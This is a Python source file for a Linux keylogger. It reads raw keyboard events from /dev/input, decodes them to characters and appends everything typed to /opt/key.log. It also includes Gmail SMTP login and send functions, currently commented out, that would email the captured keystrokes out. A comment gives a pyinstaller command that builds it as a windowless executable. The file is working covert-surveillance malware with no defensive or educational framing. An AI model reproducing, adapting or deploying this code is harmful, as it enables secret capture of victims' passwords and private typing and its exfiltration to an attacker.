#!/usr/bin/env python3

import sys
import re
import struct
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

'''
pyinstaller -F -w main.py 
'''

US_Keymap = {
    1: "[ESC]", 59: "[f1]", 60: "[f2]", 61: "[f3]", 62: "[f4]", 63: "[f5]", 64: "[f6]",
    65: "[f7]", 66: "[f8]", 67: "[f9]", 68: "[f10]", 87: "[f11]", 88: "[f12]", 111: "[Del]",
    41: "`", 15: "[Tab]", 58: "[Capslock]", 42: "[Shift(left)]",
    29: "[Crtl(left)]", 56: "[Alt(left)]", 55: "[Fn(left)]", 125: "[WinKey]",
    57: " ", 14: "[Backspace]", 43: "\\", 27: "]",
    26: "[", 39: ";", 40: "'", 28: "\n", 54: "[Shift(right)]", 53: "/", 52: ".", 51: ",",
    100: "[Alt(right)]", 106: "[RightArrow]", 105: "[LeftArrow]", 103: "[UpArrow]", 108: "[DownArrow]",
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 30: "a", 48: "b", 46: "c", 32: "d", 18: "e", 33: "f", 34: "g", 35: "h", 23: "i", 36: "j", 37: "k", 38: "l",
    50: "m", 49: "n", 24: "o", 25: "p", 16: "q", 19: "r", 31: "s", 20: "t", 22: "u", 47: "v", 17: "w", 45: "x", 21: "y",
    44: "z",12:"-",13:"="

}
# you can change how often it writes to file
BUF_SIZE = 100
username=""# enter your email
password=""# enter your password

def main():
    with open("/proc/bus/input/devices") as f:
        lines = f.readlines()

        pattern = re.compile("Handlers|EV=")
        handlers = list(filter(pattern.search, lines))

        pattern = re.compile("EV=120013")
        for idx, elt in enumerate(handlers):
            if pattern.search(elt):
                line = handlers[idx - 1]
        pattern = re.compile("event[0-9]")
        infile_path = "/dev/input/" + pattern.search(line).group(0)

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    in_file = open(infile_path, "rb")

    event = in_file.read(EVENT_SIZE)
    typed = ""

    # loggin in to email
    # try:
    #     login_to_email(username,password)
    # except:
    #     print("Error loggin in")

    while event:
        (_, _, type, code, value) = struct.unpack(FORMAT, event)

        if code != 0 and type == 1 and value == 1:
            # print("[" + str(code) + "]")
            if code in US_Keymap:
                typed += US_Keymap[code]
        if len(typed) > BUF_SIZE:
            #Send email
            # try:
            #     sendEmail(username,"Server Log",typed)
            # except:
            #     print("cannot send")

            #write to file
            file = open("/opt/key.log", "a+")
            file.write(typed)
            file.close()

            typed = ""
        event = in_file.read(EVENT_SIZE)
    #Send final email
    # try:
    #     sendEmail("username,"Final",typed)
    # except:
    #     print("cannot send final")
    # server.quit()

    #write final text
    file = open("/opt/key.log", "a+")
    file.write(typed)
    file.close()

    in_file.close()


def login_to_email(username, password):
    global server, user, passw
    user = username
    passw = password
    domain = "smtp.gmail.com"

    server = smtplib.SMTP(domain, 587)
    server.ehlo()
    server.starttls()
    server.ehlo()

    login_success = authenticate()
    if not login_success:
        return False
    return True


def sendEmail(sendto, subject, text, attachments=[]):
    FROM = user
    TO = sendto
    SUBJECT = subject

    TEXT = text

    BODY = '\r\n'.join(['To: %s' % TO,
                        'From: %s' % FROM,
                        'Subject: %s' % SUBJECT,
                        '', TEXT])
    try:
        server.sendmail(user, [TO], BODY)
        # server.quit()
        print('\n\nYour email was sent!\n\n')
    except:
        print("\n\nError sending mail! Does the recipient's email exist?\n\n")
        raise


# LOGGING INTO THE ACCOUNT
def authenticate():
    try:
        server.login(user, passw)
        return True
    except smtplib.SMTPAuthenticationError:
        return False


main()
